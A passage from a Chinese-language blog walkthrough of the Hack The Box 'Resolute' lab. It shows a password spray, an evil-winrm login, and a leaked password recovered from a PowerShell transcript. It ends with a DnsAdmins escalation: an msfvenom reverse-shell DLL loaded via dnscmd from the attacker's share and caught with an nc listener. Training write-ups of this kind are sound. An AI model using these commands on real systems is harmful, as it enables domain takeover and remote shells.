</span><br><span class="line">SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\stevie:Welcome123! STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\claire:Welcome123! STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\paulo:Welcome123! STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\steve:Welcome123! STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\annette:Welcome123! STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\annika:Welcome123! STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\per:Welcome123! STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\claude:Welcome123! STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.10.169    445    RESOLUTE         [+] megabank.local\melanie:Welcome123! </span><br><span class="line">SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\zach:Welcome123! STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\simon:Welcome123! STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\naoki:Welcome123! STATUS_LOGON_FAILURE</span><br></pre></td></tr></tbody></table></figure>
+
+<p>melanie:Welcome123!</p>
+<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">┌──(mikannse㉿kali)-[~/HTB/resolute]</span><br><span class="line">└─$ evil-winrm -i 10.10.10.169 -u <span class="string">'melanie'</span> -p <span class="string">'Welcome123!'</span> </span><br><span class="line">                                        </span><br><span class="line">Evil-WinRM shell v3.5</span><br><span class="line">                                        </span><br><span class="line">Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() <span class="keyword">function</span> is unimplemented on this machine                                                                   </span><br><span class="line">                                        </span><br><span class="line">Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm<span class="comment">#Remote-path-completion                                                                                     </span></span><br><span class="line">                                        </span><br><span class="line">Info: Establishing connection to remote endpoint</span><br><span class="line">*Evil-WinRM* PS C:\Users\melanie\Documents&gt; </span><br></pre></td></tr></tbody></table></figure>
+
+<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>没有什么特殊的组和权限，跑一下winpeas,在结果中看到一个powershell的可疑路径</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">Time Running: 0:15</span><br><span class="line">==|| PowerShell Registry Transcript Check</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Hive: HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Name                           Property</span><br><span class="line">----                           --------</span><br><span class="line">Transcription                  EnableTranscripting    : 0</span><br><span class="line">                               OutputDirectory        : C:\PSTranscipts</span><br><span class="line">                               EnableInvocationHeader : 0</span><br></pre></td></tr></tbody></table></figure>
+
+<figure class="highlight powershell"><table><tbody><tr><td class="code"><pre><span class="line">*Evil<span class="literal">-WinRM</span>* <span class="built_in">PS</span> C:\PSTranscripts&gt; cmd /c <span class="built_in">dir</span> /a</span><br><span class="line"> Volume <span class="keyword">in</span> drive C has no label.</span><br><span class="line"> Volume Serial Number is D1<span class="built_in">AC</span><span class="literal">-5AF6</span></span><br><span class="line"></span><br><span class="line"> Directory of C:\PSTranscripts</span><br><span class="line"></span><br><span class="line"><span class="number">12</span>/<span class="number">03</span>/<span class="number">2019</span>  <span class="number">07</span>:<span class="number">32</span> AM    &lt;<span class="built_in">DIR</span>&gt;          .</span><br><span class="line"><span class="number">12</span>/<span class="number">03</span>/<span class="number">2019</span>  <span class="number">07</span>:<span class="number">32</span> AM    &lt;<span class="built_in">DIR</span>&gt;          ..</span><br><span class="line"><span class="number">12</span>/<span class="number">03</span>/<span class="number">2019</span>  <span class="number">07</span>:<span class="number">45</span> AM    &lt;<span class="built_in">DIR</span>&gt;          <span class="number">20191203</span></span><br><span class="line">               <span class="number">0</span> File(s)              <span class="number">0</span> bytes</span><br><span class="line">               <span class="number">3</span> <span class="built_in">Dir</span>(s)   <span class="number">2</span>,<span class="number">461</span>,<span class="number">622</span>,<span class="number">272</span> bytes free</span><br></pre></td></tr></tbody></table></figure>
+
+<p>存在一个隐藏目录20191203</p>
+<figure class="highlight powershell"><table><tbody><tr><td class="code"><pre><span class="line">*Evil<span class="literal">-WinRM</span>* <span class="built_in">PS</span> C:\PSTranscripts\<span class="number">20191203</span>&gt; cmd /c <span class="built_in">dir</span> /a</span><br><span class="line"> Volume <span class="keyword">in</span> drive C has no label.</span><br><span class="line"> Volume Serial Number is D1<span class="built_in">AC</span><span class="literal">-5AF6</span></span><br><span class="line"></span><br><span class="line"> Directory of C:\PSTranscripts\<span class="number">20191203</span></span><br><span class="line"></span><br><span class="line"><span class="number">12</span>/<span class="number">03</span>/<span class="number">2019</span>  <span class="number">07</span>:<span class="number">45</span> AM    &lt;<span class="built_in">DIR</span>&gt;          .</span><br><span class="line"><span class="number">12</span>/<span class="number">03</span>/<span class="number">2019</span>  <span class="number">07</span>:<span class="number">45</span> AM    &lt;<span class="built_in">DIR</span>&gt;          ..</span><br><span class="line"><span class="number">12</span>/<span class="number">03</span>/<span class="number">2019</span>  <span class="number">07</span>:<span class="number">45</span> AM             <span class="number">3</span>,<span class="number">732</span> PowerShell_transcript.RESOLUTE.OJuoBGhU.<span class="number">20191203063201</span>.txt</span><br><span class="line">               <span class="number">1</span> File(s)          <span class="number">3</span>,<span class="number">732</span> bytes</span><br><span class="line">               <span class="number">2</span> <span class="built_in">Dir</span>(s)   <span class="number">2</span>,<span class="number">461</span>,<span class="number">622</span>,<span class="number">272</span> bytes free</span><br></pre></td></tr></tbody></table></figure>
+
+<figure class="highlight powershell"><table><tbody><tr><td class="code"><pre><span class="line">*Evil<span class="literal">-WinRM</span>* <span class="built_in">PS</span> C:\PSTranscripts\<span class="number">20191203</span>&gt; <span class="built_in">type</span> PowerShell_transcript.RESOLUTE.OJuoBGhU.<span class="number">20191203063201</span>.txt</span><br><span class="line">**********************</span><br><span class="line">Windows PowerShell transcript <span class="built_in">start</span></span><br><span class="line"><span class="built_in">Start</span> time: <span class="number">20191203063201</span></span><br><span class="line">&lt;SNIP&gt;</span><br><span class="line">&gt;&gt; ParameterBinding(<span class="built_in">Invoke-Expression</span>): name=<span class="string">"Command"</span>; value=<span class="string">"cmd /c net use X: \\fs01\backups ryan Serv3r4Admin4cc123!</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;SNIP&gt;</span></span><br></pre></td></tr></tbody></table></figure>
+
+<p>泄露了一个服务器上的共享以及ryan用户的密码，再次远程连接</p>
+<p>whoami /groups看一下，发现ryan是域的DNSadmin组成员,可以加载任意dll</p>
+<p><a target="_blank" rel="noopener" href="https://book.hacktricks.xyz/v/cn/windows-hardening/active-directory-methodology/privileged-groups-and-token-privileges">https://book.hacktricks.xyz/v/cn/windows-hardening/active-directory-methodology/privileged-groups-and-token-privileges</a></p>
+<p>可以生成一个dll来做一个反弹shell</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.13 LPORT=443 -f dll -o rev.dll</span><br></pre></td></tr></tbody></table></figure>
+
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\Users\ryan\Documents&gt; dnscmd Resolute /config /serverlevelplugindll \\10.10.14.13\share\rev.dll</span><br><span class="line"></span><br><span class="line">Registry property serverlevelplugindll successfully reset.</span><br><span class="line">Command completed successfully.</span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:\Users\ryan\Documents&gt; sc.exe \\resolute stop dns</span><br><span class="line"></span><br><span class="line">SERVICE_NAME: dns</span><br><span class="line">        TYPE               : 10  WIN32_OWN_PROCESS</span><br><span class="line">        STATE              : 3  STOP_PENDING</span><br><span class="line">                                (STOPPABLE, PAUSABLE, ACCEPTS_SHUTDOWN)</span><br><span class="line">        WIN32_EXIT_CODE    : 0  (0x0)</span><br><span class="line">        SERVICE_EXIT_CODE  : 0  (0x0)</span><br><span class="line">        CHECKPOINT         : 0x0</span><br><span class="line">        WAIT_HINT          : 0x0</span><br><span class="line">*Evil-WinRM* PS C:\Users\ryan\Documents&gt; sc.exe \\resolute start dns</span><br><span class="line"></span><br><span class="line">SERVICE_NAME: dns</span><br><span class="line">        TYPE               : 10  WIN32_OWN_PROCESS</span><br><span class="line">        STATE              : 2  START_PENDING</span><br><span class="line">                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)</span><br><span class="line">        WIN32_EXIT_CODE    : 0  (0x0)</span><br><span class="line">        SERVICE_EXIT_CODE  : 0  (0x0)</span><br><span class="line">        CHECKPOINT         : 0x0</span><br><span class="line">        WAIT_HINT          : 0x7d0</span><br><span class="line">        PID                : 3416</span><br><span class="line">        FLAGS              :</span><br></pre></td></tr></tbody></table></figure>
+
+<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">┌──(mikannse㉿kali)-[~/HTB/resolute]</span><br><span class="line">└─$ rlwrap -cAr nc -lvnp 443</span><br><span class="line">listening on [any] 443 ...</span><br><span class="line">connect to [10.10.14.13] from (UNKNOWN) [10.10.10.169] 56664</span><br><span class="line">Microsoft Windows [Version 10.0.14393]</span><br><span class="line">(c) 2016 Microsoft Corporation. All rights reserved.</span><br><span class="line">C:\Users\Administrator\Desktop&gt;<span class="built_in">whoami</span></span><br><span class="line"><span class="built_in">whoami</span></span><br><span class="line">nt authority\system</span><br></pre></td></tr></tbody></table></figure>
+
+<p>这里卡了还是比较久的，上传到机器上似乎是不会执行的，也许是因为有Defender</p>
+<h1 id="碎碎念"><a href="#碎碎念" class="headerlink" title="碎碎念"></a>碎碎念</h1><p>还算是比较简单的房间，其实路径都是比较明显的。ldap枚举还是比较新的东西</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="http://mikannse.space">Mikannse</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://mikannse.space/2024/09/13/%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95(%E4%B8%80%E5%9B%9B%E5%9B%9B)%E4%B9%8BHTBResolute/">http://mikannse.space/2024/09/13/打靶记录(一四四)之HTBResolute/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://mikannse.space" target="_blank">MikannseのSekai</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a><a class="post-meta__tags" href="/tags/windows/">windows</a><a class="post-meta__tags" href="/tags/Domain/">Domain</a><a class="post-meta__tags" href="/tags/%E6%89%93%E9%9D%B6/">打靶</a><a class="post-meta__tags" href="/tags/ldap/">ldap</a></div><div class="post_share"><div class="social-share" data-image="https://s2.loli.net/2023/06/22/PMAjL6lORKa5CGy.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2024/09/14/HTBSherlockOre/" title="HTBSherlockOre"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">HTBSherlockOre</div></div></a></div><div class="next-post pull-right"><a href="/2024/09/12/HTBSherlockBFT/" title="HTBSherlockBFT"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">HTBSherlockBFT</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2024/09/14/%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95(%E4%B8%80%E5%9B%9B%E4%BA%94)%E4%B9%8BHTBCascade/" title="打靶记录(一四五)之HTBCascade"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-09-14</div><div class="title">打靶记录(一四五)之HTBCascade</div></div></a></div><div><a href="/2024/07/19/%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95(%E4%B8%80%E4%B8%80%E4%B9%9D)%E4%B9%8BHMVDC02/" title="打靶记录(一一九)之HMVDC02"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-07-19</div><div class="title">打靶记录(一一九)之HMVDC02</div></div></a></div><div><a href="/2024/07/14/%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95(%E4%B8%80%E4%B8%80%E5%85%AB)%E4%B9%8BHMVDC01/" title="打靶记录(一一八)之HMVDC01"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-07-14</div><div class="title">打靶记录(一一八)之HMVDC01</div></div></a></div><div><a href="/2024/09/03/%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95(%E4%B8%80%E4%BA%8C%E5%85%AD)%E4%B9%8BHTBActive/" title="打靶记录(一二六)之HTBActive"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-09-03</div><div class="title">打靶记录(一二六)之HTBActive</div></div></a></div><div><a href="/2024/09/20/%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95(%E4%B8%80%E4%BA%94%E4%B8%80)%E4%B9%8BHTBFlight/" title="打靶记录(一五一)之HTBFlight"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-09-20</div><div class="title">打靶记录(一五一)之HTBFlight</div></div></a></div><div><a href="/2024/09/21/%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95(%E4%B8%80%E4%BA%94%E4%BA%8C)%E4%B9%8BHTBWSizzle/" title="打靶记录(一五二)之HTBWSizzle"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-09-21</div><div class="title">打靶记录(一五二)之HTBWSizzle</div></div></a></div></div></div><hr class="custom-hr"/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div><div id="comment-switch"><span class="first-comment">Valine</span><span class="switch-btn"></span><span class="second-comment">Disqus</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div><div><div id="disqus_thread"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://s2.loli.net/2023/06/22/PMAjL6lORKa5CGy.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Mikannse</div><div class="author-info__description"></div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">274</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">70</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">4</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/mikannse/mikannse.github.io"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">暂时没有公告QAQ</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="toc-number">1.</span> <span class="toc-text">端口扫描</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Enum"><span class="toc-number">2.</span> <span class="toc-text">Enum</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Password-Spray"><span class="toc-number">3.</span> <span class="toc-text">Password Spray</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%8F%90%E6%9D%83"><span class="toc-number">4.</span> <span class="toc-text">提权</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%A2%8E%E7%A2%8E%E5%BF%B5"><span class="toc-number">5.</span> <span class="toc-text">碎碎念</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/10/11/pwncollegeAssembly30/" title="pwncollegeAssembly30">pwncollegeAssembly30</a><time datetime="2024-10-10T17:05:42.000Z" title="发表于 2024-10-11 01:05:42">2024-10-11</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/10/09/pwncollege%E6%B1%87%E7%BC%96%E5%85%A5%E9%97%A8/" title="pwncollege汇编入门">pwncollege汇编入门</a><time datetime="2024-10-09T14:39:52.000Z" title="发表于 2024-10-09 22:39:52">2024-10-09</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/10/05/Git%E9%80%9F%E6%88%90/" title="Git速成">Git速成</a><time datetime="2024-10-05T04:57:08.000Z" title="发表于 2024-10-05 12:57:08">2024-10-05</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/10/03/%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95(%E4%B8%80%E5%85%AD%E4%BA%8C)%E4%B9%8BVulnHubCorrosion2/" title="打靶记录(一六二)之VulnHubCorrosion2">打靶记录(一六二)之VulnHubCorrosion2</a><time datetime="2024-10-03T09:24:11.000Z" title="发表于 2024-10-03 17:24:11">2024-10-03</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/10/02/%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95(%E4%B8%80%E5%85%AD%E4%B8%80)%E4%B9%8BVulnHubDrippingBlues1/" title="打靶记录(一六一)之VulnHubDrippingBlues1">打靶记录(一六一)之VulnHubDrippingBlues1</a><time datetime="2024-10-02T05:16:28.000Z" title="发表于 2024-10-02 13:16:28">2024-10-02</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url('https://cdn.jsdelivr.net/gh/yjr-1100/Photobag/githubioimg/background_4k.jpg')"><div id="footer-wrap"><div class="copyright">&copy;2023 - 2024 By Mikannse</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="chat-btn" type="button" title="聊天"><i class="fas fa-sms"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"><script>function loadValine () {
+  function initValine () {
+    const valine = new Valine(Object.assign({
+      el: '#vcomment',
+      appId: '',
+      appKey: '',
+      avatar: 'monsterid',
+      serverURLs: '',
+      emojiMaps: "",
+      path: window.location.pathname,
+      visitor: false
+    }, null))
+  }
+
+  if (typeof Valine === 'function') initValine() 
+  else getScript('https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js').then(initValine)
+}
+
+if ('Valine' === 'Valine' || !true) {
+  if (true) btf.loadComment(document.getElementById('vcomment'),loadValine)
+  else setTimeout(loadValine, 0)
+} else {
+  function loadOtherComment () {
+    loadValine()
+  }
+}</script><script>function loadDisqus () {
+  const disqus_config = function () {
+    this.page.url = 'http://mikannse.space/2024/09/13/%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95(%E4%B8%80%E5%9B%9B%E5%9B%9B)%E4%B9%8BHTBResolute/'
+    this.page.identifier = '/2024/09/13/%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95(%E4%B8%80%E5%9B%9B%E5%9B%9B)%E4%B9%8BHTBResolute/'
+    this.page.title = '打靶记录(一四四)之HTBResolute'
+  }
+
+  const disqusReset = () => {
+    DISQUS.reset({
+      reload: true,
+      config: disqus_config
+    })
+  }
+
+  btf.addModeChange('disqus', disqusReset)
+
+  if (window.DISQUS) disqusReset()
+  else {
+    (function() { 
+      var d = document, s = d.createElement('script');
+      s.src = 'https://.disqus.com/embed.js';
+      s.setAttribute('data-timestamp', +new Date());
+      (d.head || d.body).appendChild(s);
+    })();
+  }
+}
+
+if ('Valine' === 'Disqus' || !true) {
+  if (true) btf.loadComment(document.getElementById('disqus_thread'), loadDisqus)
+  else loadDisqus()
+} else {
+  function loadOtherComment () {
+    loadDisqus()
+  }
+}
+</script></div><script id="canvas_nest" defer="defer" color="0,0,255" opacity="0.7" zIndex="-1" count="99" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-nest.min.js"></script><script src="https://cdn.jsdelivr.net/npm/pjax/pjax.min.js"></script><script>let pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]
+
+var pjax = new Pjax({
+  elements: 'a:not([target="_blank"])',
+  selectors: pjaxSelectors,
+  cacheBust: false,
+  analytics: false,
+  scrollRestoration: false
+})
+
+document.addEventListener('pjax:send', function () {
+
+  // removeEventListener scroll 
+  window.tocScrollFn && window.removeEventListener('scroll', window.tocScrollFn)
+  window.scrollCollect && window.removeEventListener('scroll', scrollCollect)
+
+  document.getElementById('rightside').style.cssText = "opacity: ''; transform: ''"
+  
+  if (window.aplayers) {
+    for (let i = 0; i < window.aplayers.length; i++) {
+      if (!window.aplayers[i].options.fixed) {
+        window.aplayers[i].destroy()
+      }
+    }
+  }
+
+  typeof typed === 'object' && typed.destroy()
+
+  //reset readmode
+  const $bodyClassList = document.body.classList
+  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')
+
+  typeof disqusjs === 'object' && disqusjs.destroy()
+})
+
+document.addEventListener('pjax:complete', function () {
+  window.refreshFn()
+
+  document.querySelectorAll('script[data-pjax]').forEach(item => {
+    const newScript = document.createElement('script')
+    const content = item.text || item.textContent || item.innerHTML || ""
+    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
+    newScript.appendChild(document.createTextNode(content))
+    item.parentNode.replaceChild(newScript, item)
+  })
+
+  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()
+
+  typeof panguInit === 'function' && panguInit()
+
+  // google analytics
+  typeof gtag === 'function' && gtag('config', '', {'page_path': window.location.pathname});
+
+  // baidu analytics
+  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);
+
+  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()
+
+  // prismjs
+  typeof Prism === 'object' && Prism.highlightAll()
+})
+
+document.addEventListener('pjax:error', (e) => {
+  if (e.request.status === 404) {
+    pjax.loadUrl('/404.html')
+  }
+})</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div class="no-result" id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div></div></body></html>
